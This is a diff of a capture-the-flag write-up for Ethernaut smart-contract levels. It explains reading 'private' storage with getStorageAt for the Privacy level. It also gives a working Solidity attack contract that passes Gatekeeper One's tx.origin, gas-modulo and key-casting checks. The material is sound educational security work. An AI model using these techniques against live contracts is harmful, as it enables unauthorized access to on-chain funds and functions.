@@ -190,7 +190,7 @@ contract AttackElevator  {
 }
 ```
 
-## 11. Privacy
+## 12. Privacy
 This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]` but you need to first determine what position it is at. You can learn more about how storage variables are stored on the smart contract [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage). From that, we can tell that `data[2]` is stored at index 5! It's not supposed to be at index 4 because arrays are 0 based so when you want to get value at index 2, you're actually asking for the 3 value of the array i.e. index 5!! Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).
 
 Note: Just a bit more details about the packing of storage variables. The 2 `uint8` and 1 `uint16` are packed together on storage according to the order in which they appeared in the smart contract. In my case, when i did `await web3.eth.getStorageAt(instance, 2)`, I had a return value of `0x000000000000000000000000000000000000000000000000000000004931ff0a`. The last 4 characters of your string should be the same as mine because our contracts both have the same values for `flattening` and `denomination`. 
@@ -202,5 +202,62 @@ var key = data.slice(2, 34);
 await contract.unlock(key);
 ```
 
+## 13. Gatekeeper One
+This level is probably the most challenging so far since you'll need to be able to pass 5 conditional checks to be able to register as an entrant.
+
+1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
+2. `gateTwo` requires some trial and error regarding how much gas you should use. The simplest way to do this is to use `.call()` because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the `gasleft()%8191 == 0`. For me, this is 254 gas so to pass this gate, I just needed to use a gas equivalent to some multiple of 8191 + 254 e.g. 8191 * 100 + 254 = 819354. This [spreadsheet](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0) of opcodes gas cost might help... but honestly, just playing with the debugger should work.
+3. To solve `gateThree`, it makes more sense to work backwards i.e. solve part 3 then part 2 then part 1 because even if you could pass part 1, your solution for part 1 may not pass part 2 and so on. Play around with remix while using [this](https://www.tutorialspoint.com/solidity/solidity_conversions.htm) to help you better understand what gets truncated when doing explicit casting. If you know how to do bit masking, this gate should be a piece of cake for you! Quick tip - you can ignore the `uint64()` when trying to solve this gate.
+
+For some strange reason, my solution wouldn't pass on Ropsten but passed locally on remix.
+```
+pragma solidity ^0.5.0;
+
+// Remix account[0] address = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c
+
+contract AttackGatekeeperOne {
+    address public victim;
+    
+    constructor(address _victim) public {
+        victim = _victim;
+    }
+    
+    // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+    // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+    // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+    
+
+    function part3(bytes8 _gateKey) public view returns(bool) {
+        // _gateKey has 16 characters
+        // uint16(msg.sender) = truncating everything else but the last 4 characters of my address (733c) and converting it into uint16 returns 29500
+        // for uint32 == uint16, the former needs to be left padded with 0s e.g. 00001234 == 1234 = true
+        // solving uint32(uint64(_gateKey)) is trivial because it is the same as described above.
+        // This function will return true for any _gateKey with the values XXXXXXXX0000733c where X can be hexidecimal character.
+        return uint32(uint64(_gateKey)) == uint16(msg.sender);
+    }
+    
+    function part2(bytes8 _gateKey) public pure returns(bool) {
+        // This is saying that the truncated version of the _gateKey cannot match the original
+        // e.g. Using 000000000000733c will fail because the return values for both are equal
+        // However, as long as you can change any of the first 8 characters, this will pass.
+        return uint32(uint64(_gateKey)) != uint64(_gateKey);
+    }
+    
+    function part1(bytes8 _gateKey) public pure returns(bool) {
+        // you can ignore the uint64 casting because it appears on both sides.
+        // this is equivalent to uint32(_gateKey) == uint64(_gateKey);
+        // the solution to this is the same as the solution to part3 i.e. you want a _gateKey where the last 8 digits is the same as the last 4 digits after
+        // it is converted to a uint so something like 0000733c will pass.
+        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
+    }
+    
+    // So the solution to this is to use XXXXXXXX0000<insert last 4 characters of your address> where X can be any hexidecimal characters except 00000000.
+    function enter(bytes8 _key) public returns(bool) {
+        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
+        (bool success,) = victim.call.gas(819354)(payload);
+        require(success, "failed somewhere...");
+    }
+}
+```
 
 
